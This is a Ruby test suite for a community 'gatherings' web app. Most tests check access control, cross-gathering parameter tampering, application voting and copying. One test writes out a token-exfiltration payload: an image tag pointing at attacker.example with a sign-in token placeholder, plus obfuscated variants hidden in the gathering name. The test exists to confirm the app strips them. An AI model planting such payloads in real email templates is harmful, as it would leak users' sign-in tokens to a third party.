require File.expand_path("#{File.dirname(__FILE__)}/test_config.rb")

class GatheringsTest < ActiveSupport::TestCase
  include Capybara::DSL
  include Rack::Test::Methods

  def create_member
    FactoryBot.create(:account).tap { |account| @gathering.memberships.create!(account: account) }
  end

  def create_two_gatherings
    create_gathering
    @other_account = FactoryBot.create(:account)
    @other_gathering = FactoryBot.create(:gathering, account: @other_account)
  end

  test 'creating a gathering' do
    account = FactoryBot.create(:account)
    gathering = FactoryBot.build_stubbed(:gathering)
    sign_in(account)
    click_link 'Gatherings'
    click_link 'All gatherings'
    within('#content') { click_link 'Create a gathering' }
    fill_in 'Name', with: gathering.name
    fill_in 'URL', with: gathering.slug
    click_link 'Next'
    click_link 'Next'
    click_link 'Next'
    click_link 'Next'
    click_button 'Create gathering'
    assert page.has_content? 'created the gathering'
  end

  test 'editing a gathering' do
    create_gathering
    sign_in(@account)
    visit "/g/#{@gathering.slug}/edit"
    fill_in 'Name', with: (name = FactoryBot.build_stubbed(:gathering).name)
    click_button 'Update gathering'
    assert page.has_content? 'The gathering was saved'
    assert page.has_content? name
  end

  test 'copying a gathering without another admin destination redirects safely' do
    create_gathering
    sign_in(@account)

    visit "/g/#{@gathering.slug}"
    assert page.has_no_link? 'Copy'

    visit "/g/#{@gathering.slug}/copy"
    assert page.has_content? 'You need to be an admin of another gathering to copy into it.'
    assert page.has_current_path?("/g/#{@gathering.slug}", ignore_query: true)
  end

  test 'team edit rejects gathering_id from params' do
    create_two_gatherings
    team = @gathering.teams.find_by(name: 'General')

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/teams/#{team.id}/edit", team: { name: team.name, gathering_id: @other_gathering.id }

    assert_equal @gathering.id, team.reload.gathering_id
  end

  test 'teamship create cannot attach a team from another gathering' do
    create_two_gatherings
    other_team = @other_gathering.teams.create!(name: 'Kitchen', account: @other_account)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/teamships/new", teamship: { account_id: @account.id, team_id: other_team.id }

    refute other_team.teamships.find_by(account: @account)
  end

  test 'optionship create cannot attach an option from another gathering' do
    create_two_gatherings
    other_option = @other_gathering.options.create!(name: 'Cabin', type: 'Accommodation', account: @other_account)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/optionships/new", optionship: { account_id: @account.id, option_id: other_option.id }

    refute other_option.optionships.find_by(account: @account)
  end

  test 'members can join open options but not those by invitation' do
    create_gathering
    member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    open_option = @gathering.options.create!(name: 'Tent', type: 'Accommodation', account: @account)
    invitation_option = @gathering.options.create!(name: 'Cabin', type: 'Accommodation', account: @account, by_invitation: true)

    sign_in_with_rack(member)
    post '/optionships/create', option_id: open_option.id
    assert last_response.ok?
    post '/optionships/create', option_id: invitation_option.id
    assert_equal 403, last_response.status

    assert open_option.optionships.find_by(account: member)
    refute invitation_option.optionships.find_by(account: member)
  end

  test 'verdict create rejects mapplication_id from params' do
    create_two_gatherings
    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    other_mapplication = @other_gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')

    sign_in_with_rack(@account)
    post "/mapplications/#{mapplication.id}/verdicts/create", verdict: { type: 'proposer', mapplication_id: other_mapplication.id }

    assert mapplication.verdicts.find_by(account: @account)
    refute other_mapplication.verdicts.find_by(account: @account)
  end

  test 'shift create cannot use a role from another rota' do
    create_two_gatherings
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    rslot = Rslot.create!(name: 'Morning', rota: rota)
    other_rota = @other_gathering.rotas.create!(name: 'Bar', account: @other_account)
    other_role = Role.create!(name: 'Barista', rota: other_rota)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/rotas/#{rota.id}/create_shift", shift: { account_id: @account.id, role_id: other_role.id, rslot_id: rslot.id }

    assert_equal 404, last_response.status
    refute Shift.find_by(role: other_role)
    refute Shift.find_by(rslot: rslot)
  end

  test 'self-service shift create scopes roles and slots to its rota' do
    create_two_gatherings
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    rslot = Rslot.create!(name: 'Morning', rota: rota)
    other_rota = @other_gathering.rotas.create!(name: 'Bar', account: @other_account)
    other_role = Role.create!(name: 'Barista', rota: other_rota)

    sign_in_with_rack(@account)
    post '/shifts/create', rota_id: rota.id, role_id: other_role.id, rslot_id: rslot.id

    assert_equal 404, last_response.status
    refute Shift.find_by(role: other_role)
    refute Shift.find_by(rslot: rslot)
  end

  test 'member cannot reassign their shift to another account' do
    create_gathering
    member = FactoryBot.create(:account)
    other_member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    @gathering.memberships.create!(account: other_member)
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    role = Role.create!(name: 'Cook', rota: rota)
    rslot = Rslot.create!(name: 'Morning', rota: rota)
    shift = Shift.create!(account: member, role: role, rslot: rslot, rota: rota)

    sign_in_with_rack(member)
    post "/shifts/#{shift.id}/edit", shift: { account_id: other_member.id }

    assert_equal member.id, shift.reload.account_id
    assert_equal member.id, shift.membership.account_id
  end

  test 'members cannot create paid options or make free options paid' do
    create_gathering
    member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    free_option = @gathering.options.create!(name: 'Tent', type: 'Accommodation', account: member)

    sign_in_with_rack(member)
    post "/g/#{@gathering.slug}/options/new", option: { name: 'Cabin', type: 'Accommodation', cost: 100 }
    post "/g/#{@gathering.slug}/options/#{free_option.id}/edit", option: { name: 'Tent', cost: 100 }

    assert_equal 0, @gathering.options.find_by(name: 'Cabin').cost
    assert_equal 0, free_option.reload.cost
  end

  test 'admins can create paid options' do
    create_gathering

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/options/new", option: { name: 'Cabin', type: 'Accommodation', cost: 100 }

    assert_equal 100, @gathering.options.find_by(name: 'Cabin').cost
  end

  test 'inventory item cannot be assigned a team from another gathering' do
    create_two_gatherings
    other_team = @other_gathering.teams.create!(name: 'Kitchen', account: @other_account)
    item = @gathering.inventory_items.build(name: 'Tent', team: other_team, account: @account)
    refute item.valid?
    assert_includes item.errors[:team], 'must belong to the same gathering'
  end

  test 'spend cannot be assigned a team from another gathering' do
    create_two_gatherings
    other_team = @other_gathering.teams.create!(name: 'Kitchen', account: @other_account)
    spend = @gathering.spends.build(item: 'Food', amount: 10, team: other_team, account: @account)
    refute spend.valid?
    assert_includes spend.errors[:team], 'must belong to the same gathering'
  end

  test 'admin reassigning a spend updates its membership' do
    create_gathering
    member = FactoryBot.create(:account)
    member_membership = @gathering.memberships.create!(account: member)
    team = @gathering.teams.find_by(name: 'General')
    spend = @gathering.spends.create!(item: 'Food', amount: 10, team: team, account: @account)

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/spends/#{spend.id}/edit", spend: { item: 'Food', amount: 10, team_id: team.id, account_id: member.id }

    spend.reload
    assert_equal member.id, spend.account_id
    assert_equal member_membership.id, spend.membership_id
  end

  test 'members added by someone else do not follow existing members' do
    create_gathering
    admin = @account
    added = FactoryBot.create(:account)
    @gathering.memberships.create! account: added, added_by: admin
    assert Follow.find_by(follower: admin, followee: added)
    assert_nil Follow.find_by(follower: added, followee: admin)

    joiner = FactoryBot.create(:account)
    @gathering.memberships.create! account: joiner
    assert Follow.find_by(follower: joiner, followee: admin)
    assert Follow.find_by(follower: admin, followee: joiner)
    assert_nil Follow.find_by(follower: added, followee: joiner)
  end

  test 'applications submitted while signed out for an existing account do not make the account follow members' do
    create_gathering
    admin = @account
    @gathering.set(privacy: 'closed')
    victim = FactoryBot.create(:account)

    post "/g/#{@gathering.slug}/apply", account: { name: 'Anyone', email: victim.email }

    mapplication = @gathering.mapplications.find_by(account: victim)
    assert mapplication.submitted_signed_out
    mapplication.accept
    assert @gathering.memberships.find_by(account: victim).added_without_applying
    assert_nil Follow.find_by(follower: victim, followee: admin)
  end

  test 'members added by someone else after applying follow existing members' do
    create_gathering
    admin = @account
    applicant = FactoryBot.create(:account)
    @gathering.mapplications.create! account: applicant, status: 'pending'
    @gathering.memberships.create! account: applicant, added_by: admin
    assert Follow.find_by(follower: applicant, followee: admin)
    assert Follow.find_by(follower: admin, followee: applicant)
  end

  test 'members added by someone else still do not follow new members after the adder deletes their account' do
    create_gathering
    adder = FactoryBot.create(:account)
    @gathering.memberships.create! account: adder
    added = FactoryBot.create(:account)
    @gathering.memberships.create! account: added, added_by: adder
    adder.destroy
    assert_nil @gathering.memberships.find_by(account: added).added_by_id

    joiner = FactoryBot.create(:account)
    @gathering.memberships.create! account: joiner
    assert_nil Follow.find_by(follower: added, followee: joiner)
  end

  test 'gathering welcome email cannot exfiltrate a sign-in token via an image' do
    create_gathering
    @gathering.set(
      welcome_email: '<p>Hi</p><img src="https://attacker.example/%recipient.token%"><p>[gathering_name]</p><p>[sign_in_details]</p>'
    )
    @gathering.update!(name: 'Gathering %recipient.token%')
    assert_equal 'Gathering', @gathering.name
    @gathering.update!(name: 'Gathering %recipient.tok%recipient.token%en%')
    refute_includes @gathering.name, '%recipient.token%'
    @gathering.update!(name: 'Gathering &lt;img src="https://name.example/x?t=&amp;#37;recipient.token&amp;#37;"&gt;')
    refute_includes @gathering.name, '%recipient'
    @gathering.set(name: 'Gathering %%recipient.firstname%% [sign_in_details]')
    sign_in_details = %(<a href="#{ENV['BASE_URI']}/g/#{@gathering.slug}?link_token=%recipient.token%">Sign in</a>)
    html = @gathering.welcome_email_html(sign_in_details)

    assert_match(/<p[^>]*>Gathering /, html)
    assert_includes html, "Gathering %%\u200Crecipient.firstname%% [sign_in_details]"

    refute_match(%r{src="[^"]*%recipient\.token%}, html)
    refute_match(/<img[^>]*name\.example/, html)
    assert_includes html, "#{ENV['BASE_URI']}/g/#{@gathering.slug}?link_token=%recipient.token%"
    assert_equal html.scan('link_token=%recipient.token%').size, html.scan('%recipient.token%').size
  end

  test 'comment cannot attach a post from another commentable' do
    create_two_gatherings
    team = @gathering.teams.find_by(name: 'General')
    other_team = @other_gathering.teams.create!(name: 'Kitchen', account: @other_account)
    other_post = other_team.posts.create!(subject: 'Private', account: @other_account)

    sign_in_with_rack(@account)
    post '/comment', comment: { commentable_type: 'Team', commentable_id: team.id, post_id: other_post.id, body: 'Hello' }

    assert_equal 404, last_response.status
    assert_equal 0, other_post.comments.count
  end

  test 'buying a ticket to an event adds the buyer to its gathering' do
    covers 'gatherings/ticket-buyers-join-gathering@9cd984'
    create_gathering
    create_event(prices: [10], gathering: @gathering)
    buyer = FactoryBot.create(:account)
    order = @event.orders.create!(account: buyer, currency: @event.currency, value: 10, payment_completed: false)
    order.tickets.create!(event: @event, account: buyer, ticket_type: @event.ticket_types.first, price: 10)
    refute @gathering.memberships.find_by(account: buyer)

    order.payment_completed!
    assert @gathering.memberships.find_by(account: buyer)
  end

  test 'anyone with the link can join an open gathering' do
    covers 'gatherings/video-access-modes@f478bb', 'gatherings/access-modes@d37537'
    create_gathering(privacy: 'open')
    joiner = FactoryBot.create(:account)
    sign_in_with_rack(joiner)

    get "/g/#{@gathering.slug}"
    assert_equal "http://example.org/g/#{@gathering.slug}/join", last_response.location
    get "/g/#{@gathering.slug}/apply"
    assert_equal "http://example.org/g/#{@gathering.slug}/join", last_response.location

    post "/g/#{@gathering.slug}/join"
    assert @gathering.memberships.find_by(account: joiner)
  end

  test 'people must apply to join a gathering that takes applications, answering its questions' do
    covers 'gatherings/video-access-modes@f478bb', 'gatherings/video-application-questions@b04aab', 'gatherings/access-modes@d37537', 'gatherings/application-questions@2b6bb5'
    create_gathering(privacy: 'closed', application_questions: "Why do you want to come?\nWhat will you bring?")
    applicant = FactoryBot.create(:account)
    sign_in_with_rack(applicant)

    get "/g/#{@gathering.slug}"
    assert_equal "http://example.org/g/#{@gathering.slug}/apply", last_response.location
    get "/g/#{@gathering.slug}/apply"
    assert last_response.ok?
    assert_includes last_response.body, 'Why do you want to come?'
    assert_includes last_response.body, 'What will you bring?'

    post "/g/#{@gathering.slug}/join"
    refute @gathering.memberships.find_by(account: applicant)

    post "/g/#{@gathering.slug}/apply", questions: { '0' => 'Why do you want to come?', '1' => 'What will you bring?' }, answers: { '0' => 'To learn', '1' => 'Soup' }
    mapplication = @gathering.mapplications.find_by(account: applicant)
    assert_equal 'pending', mapplication.status
    assert_equal [['Why do you want to come?', 'To learn'], ['What will you bring?', 'Soup']], mapplication.answers
    refute @gathering.memberships.find_by(account: applicant)
  end

  test 'nobody can join or apply to an invitation-only gathering' do
    covers 'gatherings/video-access-modes@f478bb', 'gatherings/access-modes@d37537'
    create_gathering(privacy: 'secret')
    outsider = FactoryBot.create(:account)
    sign_in_with_rack(outsider)

    get "/g/#{@gathering.slug}"
    assert_equal 'http://example.org/', last_response.location
    get "/g/#{@gathering.slug}/apply"
    assert_equal 'http://example.org/', last_response.location

    post "/g/#{@gathering.slug}/join"
    post "/g/#{@gathering.slug}/apply"
    assert_equal 403, last_response.status
    refute @gathering.memberships.find_by(account: outsider)
    refute @gathering.mapplications.find_by(account: outsider)
  end

  test 'all members can see and vote on applications, but non-members cannot' do
    covers 'gatherings/video-propose@686842', 'gatherings/members-see-and-vote@d114df'
    create_gathering(privacy: 'closed', fixed_threshold: 2)
    member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    applicant = FactoryBot.create(:account, name: 'Applicant Person')
    mapplication = @gathering.mapplications.create!(account: applicant, status: 'pending')
    outsider = FactoryBot.create(:account)

    sign_in_with_rack(outsider)
    get "/g/#{@gathering.slug}/applications"
    assert last_response.redirect?
    post "/mapplications/#{mapplication.id}/verdicts/create", verdict: { type: 'proposer' }
    refute mapplication.verdicts.find_by(account: outsider)

    sign_in_with_rack(member)
    get "/g/#{@gathering.slug}/applications"
    assert last_response.ok?
    assert_includes last_response.body, 'Applicant Person'
    post "/mapplications/#{mapplication.id}/verdicts/create", verdict: { type: 'proposer' }
    assert mapplication.verdicts.proposers.find_by(account: member)
  end

  test 'applications can have proposers only, or proposers and supporters' do
    covers 'gatherings/video-propose@686842', 'gatherings/vote-types@ccfd7a'
    create_gathering(privacy: 'closed', fixed_threshold: 2)
    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    sign_in_with_rack(@account)

    get "/g/#{@gathering.slug}/applications"
    assert_includes last_response.body, '>Propose</a>'
    refute_includes last_response.body, '>Support</a>'
    mapplication.verdicts.create!(account: @account, type: 'proposer')
    mapplication.verdicts.create!(account: create_member, type: 'supporter')
    refute mapplication.meets_threshold

    @gathering.update!(enable_supporters: true)
    sign_in_with_rack(create_member)
    get "/g/#{@gathering.slug}/applications"
    assert_includes last_response.body, '>Support</a>'
    assert mapplication.reload.meets_threshold
  end

  test 'an application is accepted at the magic number of proposers plus supporters, with at least one proposer' do
    covers 'gatherings/video-magic-number@7fc314', 'gatherings/magic-number@66775d', 'gatherings/median-magic-number@bbe05c'
    create_gathering(privacy: 'closed', fixed_threshold: 2, enable_supporters: true)
    supporters_only = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    supporters_only.verdicts.create!(account: @account, type: 'supporter')
    supporters_only.verdicts.create!(account: create_member, type: 'supporter')
    assert_equal 'pending', supporters_only.reload.status

    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    mapplication.verdicts.create!(account: @account, type: 'proposer')
    assert_equal 'pending', mapplication.reload.status
    mapplication.verdicts.create!(account: create_member, type: 'supporter')
    assert_equal 'accepted', mapplication.reload.status
    assert @gathering.memberships.find_by(account: mapplication.account)
  end

  test 'with a magic number of 0, an application is accepted as soon as it is made' do
    covers 'gatherings/magic-number@66775d'
    create_gathering(privacy: 'closed', fixed_threshold: 0)
    applicant = FactoryBot.create(:account)
    sign_in_with_rack(applicant)

    post "/g/#{@gathering.slug}/apply"
    assert_equal 'accepted', @gathering.mapplications.find_by(account: applicant).status
    assert @gathering.memberships.find_by(account: applicant)
  end

  test 'the magic number can be the median of the numbers members suggest' do
    covers 'gatherings/median-magic-number@bbe05c'
    create_gathering(privacy: 'closed', fixed_threshold: 5, democratic_threshold: true)
    assert_nil @gathering.fixed_threshold
    members = Array.new(2) { FactoryBot.create(:account) }
    members.each { |member| @gathering.memberships.create!(account: member) }

    [[@account, 1], [members[0], 2], [members[1], 4]].each do |account, number|
      sign_in_with_rack(account)
      post "/g/#{@gathering.slug}/threshold", desired_threshold: number
    end
    assert_equal 2, @gathering.reload.threshold

    mapplication = @gathering.mapplications.create!(account: FactoryBot.create(:account), status: 'pending')
    mapplication.verdicts.create!(account: @account, type: 'proposer')
    assert_equal 'pending', mapplication.reload.status
    mapplication.verdicts.create!(account: members[0], type: 'proposer')
    assert_equal 'accepted', mapplication.reload.status
  end

  test 'joining a tier requests its cost, until the tier is full' do
    covers 'gatherings/video-join-tier-payment@1d3412'
    create_gathering
    member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    tier = @gathering.options.create!(name: 'Standard', type: 'Tier', capacity: 1, cost: 100, account: @account)

    sign_in_with_rack(member)
    post '/optionships/create', option_id: tier.id
    assert_equal 100, @gathering.memberships.find_by(account: member).requested_contribution
    assert @gathering.memberships.find_by(account: member).owes_contribution?

    sign_in_with_rack(@account)
    post '/optionships/create', option_id: tier.id
    refute tier.optionships.find_by(account: @account)
  end

  test 'members sign up to shifts and admins schedule activities onto the timetable' do
    covers 'gatherings/video-schedule-activity@396032', 'gatherings/video-shift-signup@8c93ae'
    create_gathering
    member = FactoryBot.create(:account)
    @gathering.memberships.create!(account: member)
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    role = Role.create!(name: 'Cook', rota: rota)
    rslot = Rslot.create!(name: 'Morning', rota: rota)
    timetable = @gathering.timetables.create!(name: 'Workshops', account: @account)
    tslot = timetable.tslots.create!(name: '10am')
    space = timetable.spaces.create!(name: 'Dome')
    tactivity = timetable.tactivities.create!(name: 'Yoga', account: member)

    sign_in_with_rack(member)
    post '/shifts/create', rota_id: rota.id, role_id: role.id, rslot_id: rslot.id
    assert Shift.find_by(account: member, role: role, rslot: rslot)

    sign_in_with_rack(@account)
    post "/tactivities/#{tactivity.id}/schedule", tslot_id: tslot.id, space_id: space.id
    tactivity.reload
    assert_equal tslot.id, tactivity.tslot_id
    assert_equal space.id, tactivity.space_id
  end

  test 'each of the six features can be enabled or disabled' do
    covers 'gatherings/optional-features@9dfad8'
    features = { contributions: 'options', teams: 'teams', timetables: 'timetables/new', rotas: 'rotas/new', inventory: 'inventory', budget: 'budget' }
    create_gathering
    sign_in_with_rack(@account)

    get "/g/#{@gathering.slug}"
    features.each_value { |path| assert_includes last_response.body, %(href="/g/#{@gathering.slug}/#{path}") }

    @gathering.update!(features.keys.to_h { |feature| [:"enable_#{feature}", false] })
    get "/g/#{@gathering.slug}"
    assert last_response.ok?
    features.each_value { |path| refute_includes last_response.body, %(href="/g/#{@gathering.slug}/#{path}") }
  end

  test 'copying a gathering copies its timetables, rotas and options but not its members, payments, activities or shifts' do
    covers 'gatherings/copy-timetables@ed0f5d', 'gatherings/copy-rotas@c68086', 'gatherings/copy-options@a1c0af', 'gatherings/copy-not-members@0f6c02'
    create_two_gatherings
    @other_gathering.memberships.create!(account: @account, admin: true)
    member = FactoryBot.create(:account)
    membership = @gathering.memberships.create!(account: member)
    timetable = @gathering.timetables.create!(name: 'Workshops', account: @account)
    tslot = timetable.tslots.create!(name: '10am')
    space = timetable.spaces.create!(name: 'Dome')
    timetable.tactivities.create!(name: 'Yoga', account: member, tslot: tslot, space: space)
    rota = @gathering.rotas.create!(name: 'Kitchen', account: @account)
    role = Role.create!(name: 'Cook', rota: rota, worth: 2)
    rslot = Rslot.create!(name: 'Morning', rota: rota, worth: 3)
    Shift.create!(account: member, role: role, rslot: rslot, rota: rota)
    option = @gathering.options.create!(name: 'Cabin', description: 'Cosy', type: 'Accommodation', capacity: 4, cost: 50, split_cost: true, account: @account)
    option.optionships.create!(account: member, gathering: @gathering)
    Payment.create!(membership: membership, amount: 50, currency: 'GBP')

    sign_in_with_rack(@account)
    post "/g/#{@gathering.slug}/copy", gathering_id: @other_gathering.id
    @other_gathering.reload

    new_timetable = @other_gathering.timetables.find_by(name: 'Workshops')
    assert_equal ['10am'], new_timetable.tslots.pluck(:name)
    assert_equal ['Dome'], new_timetable.spaces.pluck(:name)
    new_rota = @other_gathering.rotas.find_by(name: 'Kitchen')
    assert_equal [['Cook', 2.0]], new_rota.roles.pluck(:name, :worth)
    assert_equal [['Morning', 3.0]], new_rota.rslots.pluck(:name, :worth)
    new_option = @other_gathering.options.find_by(name: 'Cabin')
    assert_equal ['Cosy', 'Accommodation', 4, 50, true], [new_option.description, new_option.type, new_option.capacity, new_option.cost, new_option.split_cost]

    refute @other_gathering.memberships.find_by(account: member)
    assert_equal 0, @other_gathering.payments.count
    assert_equal 0, @other_gathering.tactivities.count
    assert_equal 0, @other_gathering.shifts.count
    assert_equal 0, @other_gathering.optionships.count
  end

  test 'site admins can browse and administer every gathering without being a member, but not act as a member' do
    create_gathering(privacy: 'secret', listed: false)
    team = @gathering.teams.create!(name: 'Kitchen', account: @account)
    rota = @gathering.rotas.create!(name: 'Bar', account: @account)
    @gathering.rotas.create!(name: 'Door', account: @account) # with one rota, the rotas overview redirects to it
    timetable = @gathering.timetables.create!(name: 'Workshops', account: @account)
    member = FactoryBot.create(:account, name: 'Member Person')
    @gathering.memberships.create!(account: member)
    @gathering.options.create!(name: 'Tent', type: 'Accommodation', account: @account).optionships.create!(account: member, gathering: @gathering)
    shift = Shift.create!(account: member, role: Role.create!(name: 'Cook', rota: rota), rslot: Rslot.create!(name: 'Morning', rota: rota), rota: rota)
    site_admin = FactoryBot.create(:account, admin: true)
    outsider = FactoryBot.create(:account)

    sign_in_with_rack(outsider)
    get '/gatherings'
    assert_not_includes last_response.body, @gathering.name
    get "/g/#{@gathering.slug}/members"
    assert last_response.redirect?

    sign_in_with_rack(site_admin)
    get '/gatherings'
    assert_includes last_response.body, @gathering.name
    [
      '', '/todos', '/members', '/applications', '/applications/paused', '/threshold', '/options', '/teams', "/teams/#{team.id}",
      '/rotas', "/rotas/#{rota.id}", '/timetables', "/timetables/#{timetable.id}", '/inventory', '/budget', '/payments', '/edit'
    ].each do |path|
      get "/g/#{@gathering.slug}#{path}"
      assert last_response.ok?, "GET /g/#{@gathering.slug}#{path} returned #{last_response.status}"
    end

    get "/g/#{@gathering.slug}/options"
    assert_includes last_response.body, 'Member Person'

    get "/shifts/#{shift.id}/edit"
    assert last_response.ok?
    post "/shifts/#{shift.id}/destroy"
    refute Shift.find(shift.id)

    post "/g/#{@gathering.slug}/rotas/#{rota.id}/destroy"
    refute @gathering.rotas.find(rota.id)

    post "/g/#{@gathering.slug}/teams/new", team: { name: 'Garden' }
    assert last_response.redirect?
    refute @gathering.teams.find_by(name: 'Garden')
    get "/g/#{@gathering.slug}/unsubscribe"
    assert last_response.redirect?
    refute @gathering.memberships.find_by(account: site_admin)
  end
end
